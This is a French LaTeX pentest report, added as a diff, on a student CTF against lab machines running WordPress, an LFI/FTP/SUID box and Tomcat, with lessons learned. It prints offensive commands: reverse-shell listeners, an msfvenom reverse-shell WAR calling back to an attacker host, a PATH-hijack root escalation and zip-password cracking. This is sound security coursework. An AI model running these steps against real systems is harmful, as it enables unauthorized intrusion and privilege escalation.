@@ -1,0 +1,328 @@
+\documentclass[11pt,a4paper]{article}
+
+% =========================================================================
+%  RAPPORT CTF — PENTEST DE 5 MACHINES
+%  Auteurs : HONORINE Kylian & GRONDIN Angélique
+%  Theme   : Sécurité offensive — palette rouge / noir
+% =========================================================================
+
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[french]{babel}
+\usepackage{lmodern}
+\usepackage[a4paper,margin=2.2cm,top=2.6cm,bottom=2.4cm]{geometry}
+\usepackage{xcolor}
+\usepackage{fontawesome5}
+\usepackage{tikz}
+\usetikzlibrary{shapes.geometric,positioning,calc,arrows.meta,decorations.pathreplacing}
+\usepackage{titlesec}
+\usepackage[most]{tcolorbox}
+\usepackage{listings}
+\usepackage{fancyhdr}
+\usepackage{booktabs}
+\usepackage{tabularx}
+\usepackage{array}
+\usepackage{colortbl}
+\usepackage{enumitem}
+\usepackage{microtype}
+\usepackage[bookmarks=true,colorlinks=true,linkcolor=accent,urlcolor=accent,citecolor=accent]{hyperref}
+
+% --- Palette : sécurité offensive ----------------------------------------
+\definecolor{primary}{HTML}{0F1419}        % presque noir
+\definecolor{accent}{HTML}{C8102E}         % rouge offensif
+\definecolor{accentdark}{HTML}{8B0000}
+\definecolor{light}{HTML}{F5F5F7}
+\definecolor{midgray}{HTML}{6B7280}
+\definecolor{codebg}{HTML}{1B1F23}
+\definecolor{codefg}{HTML}{F8F8F2}
+\definecolor{codekw}{HTML}{FF6188}
+\definecolor{codestr}{HTML}{A9DC76}
+\definecolor{codecmt}{HTML}{75715E}
+
+% --- Typographie des titres ----------------------------------------------
+\titleformat{\section}{\sffamily\Large\bfseries\color{primary}}{\thesection}{0.8em}{}[\vspace{-0.4ex}{\color{accent}\rule{\linewidth}{1.2pt}}]
+\titleformat{\subsection}{\sffamily\large\bfseries\color{accent}}{\thesubsection}{0.6em}{}
+\titleformat{\subsubsection}{\sffamily\normalsize\bfseries\color{primary}}{\thesubsubsection}{0.5em}{}
+\titlespacing*{\section}{0pt}{1.6em}{0.8em}
+
+% --- En-tête / pied de page ----------------------------------------------
+\pagestyle{fancy}
+\fancyhf{}
+\renewcommand{\headrulewidth}{0pt}
+\renewcommand{\footrulewidth}{0pt}
+\fancyhead[L]{\footnotesize\sffamily\color{midgray}\faSkullCrossbones~CTF — Sécurité offensive}
+\fancyhead[R]{\footnotesize\sffamily\color{midgray}Honorine \& Kylian}
+\fancyfoot[C]{\footnotesize\sffamily\color{midgray}\thepage}
+
+% --- Listings (style terminal) -------------------------------------------
+\lstdefinestyle{terminal}{
+  backgroundcolor=\color{codebg},
+  basicstyle=\ttfamily\footnotesize\color{codefg},
+  keywordstyle=\color{codekw}\bfseries,
+  stringstyle=\color{codestr},
+  commentstyle=\color{codecmt}\itshape,
+  showstringspaces=false,
+  breaklines=true,
+  frame=none,
+  framesep=8pt,
+  framerule=0pt,
+  rulecolor=\color{codebg},
+  xleftmargin=12pt,
+  xrightmargin=12pt,
+  belowskip=0pt,
+  aboveskip=0pt,
+  columns=fullflexible,
+  inputencoding=utf8,
+  extendedchars=true,
+  literate={é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ô}{{\^o}}1 {î}{{\^\i}}1 {ç}{{\c{c}}}1 {ù}{{\`u}}1 {â}{{\^a}}1 {É}{{\'E}}1 {È}{{\`E}}1
+}
+\lstset{style=terminal,language=bash}
+
+\newtcblisting{shellbox}[1][]{
+  listing only,
+  enhanced jigsaw, breakable,
+  colback=codebg, colframe=accent,
+  arc=2pt, boxrule=0pt, leftrule=3pt,
+  left=8pt, right=8pt, top=4pt, bottom=4pt,
+  listing options={style=terminal,language=bash},
+  #1
+}
+
+% --- Boîtes thématiques --------------------------------------------------
+\newtcolorbox{infobox}[1][]{
+  enhanced, colback=light, colframe=accent,
+  arc=2pt, boxrule=0pt, leftrule=3pt,
+  left=10pt, right=10pt, top=6pt, bottom=6pt,
+  fontupper=\small, #1
+}
+\newtcolorbox{flagbox}[1][]{
+  enhanced, colback=accent!10, colframe=accent,
+  arc=2pt, boxrule=0pt, leftrule=3pt,
+  left=10pt, right=10pt, top=6pt, bottom=6pt,
+  fontupper=\small, #1
+}
+\newtcolorbox{warnbox}[1][]{
+  enhanced, colback=primary!5, colframe=primary,
+  arc=2pt, boxrule=0pt, leftrule=3pt,
+  left=10pt, right=10pt, top=6pt, bottom=6pt,
+  fontupper=\small, #1
+}
+
+% --- Étapes numérotées ---------------------------------------------------
+\newcommand{\step}[2]{%
+\par\noindent\begin{minipage}{0.06\linewidth}\begin{tikzpicture}\node[circle,fill=accent,text=white,minimum size=1.6em,font=\sffamily\bfseries\small]{#1};\end{tikzpicture}\end{minipage}%
+\begin{minipage}{0.93\linewidth}\textbf{#2}\end{minipage}\par\smallskip}
+
+\setlist[itemize]{leftmargin=*,itemsep=2pt,topsep=4pt}
+\setlist[enumerate]{leftmargin=*,itemsep=2pt,topsep=4pt}
+
+% =========================================================================
+\begin{document}
+\pagenumbering{gobble}
+
+% ---- PAGE DE TITRE ------------------------------------------------------
+\begin{tikzpicture}[remember picture, overlay]
+  % Bandeau supérieur sombre
+  \fill[primary] (current page.north west) rectangle ([yshift=-9cm]current page.north east);
+  % Lignes d'accent
+  \fill[accent] ([yshift=-9cm]current page.north west) rectangle ([yshift=-9.25cm]current page.north east);
+  % Logo : terminal stylisé avec skull
+  \node[anchor=center] at ([yshift=-4.6cm]current page.north) {%
+    \begin{tikzpicture}[scale=1]
+      % cadre terminal
+      \fill[white,rounded corners=4pt] (-2.2,-1.6) rectangle (2.2,1.6);
+      \fill[primary,rounded corners=4pt] (-2.2,1) rectangle (2.2,1.6);
+      % boutons fenêtre
+      \fill[accent] (-1.95,1.3) circle (0.13);
+      \fill[orange!80!yellow] (-1.55,1.3) circle (0.13);
+      \fill[green!60!black] (-1.15,1.3) circle (0.13);
+      % skull au centre
+      \node[scale=2.6,accent] at (0,-0.05) {\faSkullCrossbones};
+      % prompt
+      \node[font=\ttfamily\bfseries\small,primary] at (-1.4,0.55) {\$};
+      \node[font=\ttfamily\bfseries\small,primary] at (-0.95,0.55) {root@kali};
+    \end{tikzpicture}};
+  % Titre
+  \node[anchor=north, white, font=\sffamily\Huge\bfseries] at ([yshift=-6.7cm]current page.north) {CTF — Cinq Machines};
+  \node[anchor=north, accent, font=\sffamily\Large] at ([yshift=-7.65cm]current page.north) {Rapport de Test de Pénétration};
+  \node[anchor=north, white!75!primary, font=\sffamily\small] at ([yshift=-8.4cm]current page.north) {SAE Autonomie \textbullet{} Sécurité Offensive};
+
+  % Bas de page : auteurs
+  \node[anchor=south west, primary, font=\sffamily\small] at ([xshift=2.2cm,yshift=3cm]current page.south west) {\textbf{\textcolor{accent}{Auteurs}}};
+  \node[anchor=south west, primary, font=\sffamily\small] at ([xshift=2.2cm,yshift=2.5cm]current page.south west) {Honorine \textbullet{} Kylian};
+  \node[anchor=south east, primary, font=\sffamily\small] at ([xshift=-2.2cm,yshift=3cm]current page.south east) {\textbf{\textcolor{accent}{Date}}};
+  \node[anchor=south east, primary, font=\sffamily\small] at ([xshift=-2.2cm,yshift=2.5cm]current page.south east) {Février 2026};
+  % Pied
+  \fill[accent] ([yshift=1.3cm]current page.south west) rectangle ([yshift=1.4cm]current page.south east);
+  \node[anchor=south, midgray, font=\sffamily\footnotesize] at ([yshift=0.6cm]current page.south) {IUT Réseaux \& Télécommunications — Université de La Réunion};
+\end{tikzpicture}
+\newpage
+
+\pagenumbering{arabic}
+\setcounter{page}{1}
+
+% ---- SOMMAIRE -----------------------------------------------------------
+{\sffamily
+\hypersetup{linkcolor=primary}
+\renewcommand{\contentsname}{\textcolor{accent}{\faList~} Sommaire}
+\tableofcontents
+}
+\vspace{0.4cm}
+
+% ---- INTRODUCTION -------------------------------------------------------
+\section{Contexte de la mission}
+
+\begin{infobox}[title={\faBullseye~Objectif}]
+Compromettre cinq machines cibles et obtenir un accès \texttt{root} sur chacune, en mobilisant des techniques de pentest variées : reconnaissance, exploitation de services web, élévation de privilèges, et analyse de binaires SUID.
+\end{infobox}
+
+Chaque machine combine plusieurs vulnérabilités et configurations défaillantes représentatives de scénarios rencontrés en environnement réel. Le présent rapport documente les chemins d'attaque retenus, les outils mobilisés, et les contre-mesures à déployer.
+
+\medskip
+\noindent\textbf{Résultat global :} \textcolor{accent}{\textbf{4/5 machines compromises (80\%)}} \textemdash{} Machine 5 partiellement aboutie.
+
+% ---- MACHINE 1 ----------------------------------------------------------
+\section{Machine 1 — WordPress}
+
+\subsection{Reconnaissance}
+Scan Nmap avec détection de versions et scripts par défaut sur la cible \texttt{192.168.1.17} :
+\begin{shellbox}
+nmap -sV -sC 192.168.1.17
+\end{shellbox}
+Le scan révèle : SSH (22), HTTP (80), POP3 (110), IMAP (143). Le port 80 héberge un site \og en test \fg{}.
+
+\subsection{Découverte du CMS}
+Inspection manuelle du fichier \texttt{robots.txt} : un répertoire \texttt{/wordpress/} est exposé, confirmant le CMS cible. Énumération complète des chemins avec Gobuster :
+\begin{shellbox}
+gobuster dir -u http://192.168.1.17 \
+  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 40
+\end{shellbox}
+Gobuster identifie également \texttt{/upload}, mais l'effort se concentre sur l'installation WordPress.
+
+\subsection{Exploitation}
+La page \texttt{wp-login.php} accepte des identifiants administrateurs faibles. Une fois connectés au back-office, nous éditons un plugin pour y injecter un reverse shell PHP pointant vers Kali sur le port 9001.
+
+\begin{shellbox}
+nc -lvnp 9001
+\end{shellbox}
+
+L'activation du plugin déclenche la connexion : nous obtenons un shell en tant que \texttt{www-data}.
+
+\subsection{Élévation de privilèges}
+Le shell est stabilisé via Python (\texttt{python -c 'import pty; pty.spawn("/bin/bash")'}). L'exploration de \texttt{wp-config.php} expose les identifiants MySQL, qui se révèlent réutilisés pour le compte \texttt{root} système.
+
+\begin{flagbox}[title={\faFlag~Machine 1 compromise}]
+\textbf{Vecteur :} Réutilisation des identifiants MySQL pour l'accès \texttt{root}.\\
+\textbf{Leçon :} Une politique de mot de passe distincte par service est non négociable.
+\end{flagbox}
+
+% ---- MACHINE 4 ----------------------------------------------------------
+\section{Machine 4 — LFI + FTP + Binaire SUID}
+
+\subsection{Exploration initiale}
+Le serveur Apache filtre les requêtes selon l'\texttt{User-Agent}. Contournement immédiat en se faisant passer pour Googlebot :
+\begin{shellbox}
+curl -A "Googlebot" http://192.168.1.46/robots.txt
+\end{shellbox}
+Un répertoire caché est révélé.
+
+\subsection{Local File Inclusion}
+La vérification des paramètres GET expose une vulnérabilité LFI permettant de lire \texttt{/etc/passwd} et autres fichiers sensibles \textemdash{} y compris la configuration du serveur, qui mentionne un service FTP en écriture.
+
+\subsection{Pivot via FTP}
+Le répertoire \texttt{pub} du FTP autorise l'\texttt{anonymous upload}. Nous y déposons un reverse shell PHP, puis l'exécutons via la LFI précédemment découverte.
+
+\begin{shellbox}
+nc -lvnp 9001
+# Déclenchement : LFI ciblant /var/ftp/pub/shell.php
+\end{shellbox}
+
+Connexion reçue en tant que \texttt{www-data}. Le flag utilisateur est récupéré dans \texttt{/var/www/}.
+
+\subsection{Analyse du binaire SUID}
+Dans \texttt{/home/tom/}, un binaire \texttt{adminshell} possède le bit SUID. Son code source révèle une vérification d'identité par appel à \texttt{whoami} sans chemin absolu :
+
+\begin{shellbox}[listing options={style=terminal,language=C}]
+if (strcmp(getlogin(), "admin") == 0) {
+    system("whoami");  // PATH non controle : injectable
+}
+\end{shellbox}
+
+\subsection{PATH Hijacking}
+Un faux binaire \texttt{whoami} est créé pour spawner un shell, le \texttt{PATH} est manipulé pour le résoudre en priorité :
+\begin{shellbox}
+echo '/bin/sh' > /tmp/whoami && chmod +x /tmp/whoami
+export PATH=/tmp:$PATH
+./adminshell
+\end{shellbox}
+
+Le binaire SUID exécute notre faux \texttt{whoami} avec les privilèges \texttt{root}.
+
+\begin{flagbox}[title={\faFlag~Machine 4 compromise — root obtenu}]
+\textbf{Vecteur :} LFI \(\rightarrow\) FTP anonyme \(\rightarrow\) PATH Hijacking sur binaire SUID.\\
+\textbf{Leçon :} Tout appel système dans un binaire privilégié doit utiliser un chemin absolu.
+\end{flagbox}
+
+\subsection{Nettoyage}
+Suppression du \texttt{shell.php} déposé sur le FTP pour ne pas laisser de trace exploitable par d'autres équipes.
+
+% ---- MACHINE 5 ----------------------------------------------------------
+\section{Machine 5 — Tomcat}
+
+\subsection{Découverte}
+Nikto identifie un fichier \texttt{backup.zip} accessible sans authentification.
+\begin{shellbox}
+nikto -h http://target
+fcrackzip -D -p rockyou.txt -u backup.zip
+\end{shellbox}
+L'archive est protégée par mot de passe ; \texttt{fcrackzip} le craque en quelques minutes via dictionnaire.
+
+\subsection{Obtention du shell}
+Un fichier WAR contenant un reverse shell est généré avec Metasploit, puis déployé via Tomcat Manager (identifiants extraits du backup) :
+\begin{shellbox}
+msfvenom -p java/jsp_shell_reverse_tcp \
+  LHOST=10.0.0.5 LPORT=9001 -f war > shell.war
+\end{shellbox}
+
+Le déploiement réussit et un shell utilisateur \texttt{jerry} est obtenu.
+
+\subsection{Limite}
+\begin{warnbox}[title={\faExclamationTriangle~Élévation non aboutie}]
+Malgré de nombreuses tentatives (énumération SUID, exploits kernel, sudo, capabilities), l'élévation vers \texttt{root} n'a pas pu être réalisée dans le temps imparti. Le flag utilisateur a néanmoins été récupéré dans \texttt{/home/jerry/}.
+\end{warnbox}
+
+% ---- TABLEAU RÉCAPITULATIF ----------------------------------------------
+\section{Synthèse des compromissions}
+
+\renewcommand{\arraystretch}{1.35}
+\begin{tabularx}{\linewidth}{@{}>{\bfseries}l X >{\centering\arraybackslash}p{2.4cm}@{}}
+\toprule
+\rowcolor{light} Machine & Vecteur principal & Statut \\ \midrule
+1 — WordPress & Plugin malveillant + réutilisation credentials MySQL & \textcolor{accent}{\faCheckCircle~Root} \\
+2 — GRUB      & Modification entrée GRUB \(\rightarrow\) shell init & \textcolor{accent}{\faCheckCircle~Root} \\
+3 — FTP exploit & Exploitation service FTP vulnérable & \textcolor{accent}{\faCheckCircle~Root} \\
+4 — LFI + FTP   & LFI \(\rightarrow\) FTP \(\rightarrow\) PATH Hijacking SUID & \textcolor{accent}{\faCheckCircle~Root} \\
+5 — Tomcat      & Backup ZIP cracké + WAR Manager & \textcolor{orange!80!black}{\faExclamationCircle~Partiel} \\
+\bottomrule
+\end{tabularx}
+
+% ---- LESSONS LEARNED ----------------------------------------------------
+\section{Enseignements et points clés}
+
+\begin{enumerate}
+  \item \textbf{La reconnaissance conditionne tout.} Un scan Nmap mal calibré ferme des portes que l'on ne rouvre pas.
+  \item \textbf{La réutilisation des mots de passe reste critique.} Trois machines sur cinq exploitées via ce vecteur.
+  \item \textbf{Les configurations par défaut sont dangereuses.} Comptes admin/admin, FTP anonyme, Tomcat Manager exposé.
+  \item \textbf{L'élévation de privilèges récompense la patience.} Étudier les binaires SUID, examiner les variables d'environnement, lire le code source quand il est accessible.
+  \item \textbf{Le nettoyage des traces fait partie du pentest.} Un shell oublié sur un FTP partagé est une faille livrée à autrui.
+  \item \textbf{Combiner les vulnérabilités} : aucune des cinq compromissions ne repose sur une seule faille.
+\end{enumerate}
+
+\vspace{1cm}
+\begin{center}
+{\sffamily\itshape\color{midgray}\large
+\og La sécurité n'est pas un produit, mais un processus. \fg{}}\\[2pt]
+{\footnotesize\color{midgray}— Bruce Schneier}
+\end{center}
+
+\end{document}
